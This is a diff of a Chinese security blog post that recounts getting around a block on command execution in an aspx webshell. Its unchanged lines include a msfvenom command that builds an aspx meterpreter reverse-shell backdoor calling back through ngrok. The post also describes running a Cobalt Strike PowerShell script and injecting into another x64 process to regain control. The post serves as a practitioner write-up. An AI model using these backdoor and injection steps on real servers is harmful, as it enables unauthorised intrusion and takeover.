@@ -973,7 +973,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-08-16 20:14:49">2019-08-16 16:22</time>
+        创建时间:<time class="date" title="更新时间: 2019-08-16 20:25:15">2019-08-16 16:22</time>
         
     </div>
     <div class="article-meta">
@@ -1016,7 +1016,13 @@
 <p>最后面还是无法执行，后面去问susu。让我操作一波powershell看看，后面我就用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngrok+msf反弹到本地</span><br></pre></td></tr></table></figure></p>
 <p>生成apsx的后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ngrok的IP&gt; LPORT=&lt;ngrok的端口&gt; -f aspx &gt; demo.aspx</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://s2.ax1x.com/2019/08/16/meDPjU.png" alt="ngrok反弹"></p>
-<p>msf接收到shell之后，<figure class="highlight plain"><figcaption><span>powershell```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">![powershell](https://s2.ax1x.com/2019/08/16/me6fY9.png)</span><br><span class="line"></span><br><span class="line">可以执行powershell里的命令，尝试执行cs生成的powershell command,还是不行</span><br><span class="line">![失败](https://s2.ax1x.com/2019/08/16/mect6x.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">后面用cs生成了一个ps1，上传到shell目录下。然后用ps执行脚本</span><br><span class="line">![反弹到cs](https://s2.ax1x.com/2019/08/16/mmmRMT.png)</span><br><span class="line"></span><br><span class="line">cobalstrike</span><br><span class="line">![me2rQI.png](https://s2.ax1x.com/2019/08/16/me2rQI.png)</span><br><span class="line"></span><br><span class="line">后面回到cs发现还是不能执行命令，后面尝试注入到其他进程回连看看能不能执行命令，没想到真的可以（由于当时没有截图，这里就说一下要注意的）</span><br><span class="line"></span><br><span class="line">要注意的是，要```注入一个 x64位的进程，而且不能是当前用户名的进程即可</span><br></pre></td></tr></table></figure></p>
+<p>msf接收到shell之后，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/08/16/me6fY9.png" alt="powershell"></p>
+<p>可以执行powershell里的命令，尝试执行cs生成的powershell command,还是不行<br><img src="https://s2.ax1x.com/2019/08/16/mect6x.png" alt="失败"></p>
+<p>后面用cs生成了一个ps1，上传到shell目录下。然后用ps执行脚本<br><img src="https://s2.ax1x.com/2019/08/16/mmmRMT.png" alt="反弹到cs"></p>
+<p>cobalstrike<br><img src="https://s2.ax1x.com/2019/08/16/me2rQI.png" alt="me2rQI.png"></p>
+<p>后面回到cs发现还是不能执行命令，后面尝试注入到其他进程回连看看能不能执行命令，没想到真的可以（由于当时没有截图，这里就说一下要注意的）</p>
+<p>要注意的是，要<code>注入一个 x64位的进程，而且不能是当前用户名的进程即可</code></p>
 <p><img src="https://s2.ax1x.com/2019/08/16/mmmrIs.png" alt="mmmrIs.png"></p>
 <p>后面在菜刀中翻到管理员添加的账号<br><img src="https://s2.ax1x.com/2019/08/16/mmnZwQ.png" alt="mmnZwQ.png"></p>
 
@@ -1032,7 +1038,7 @@
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="9most">9most</a></p>
     <p><span class="copy-title">发布时间:</span>2019-08-16, 16:22:06</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-16, 20:14:49</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-16, 20:25:15</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/2f92e5fe.html" title="记一次绕过aspx禁止执行命令">http://422926799.github.io/posts/2f92e5fe.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
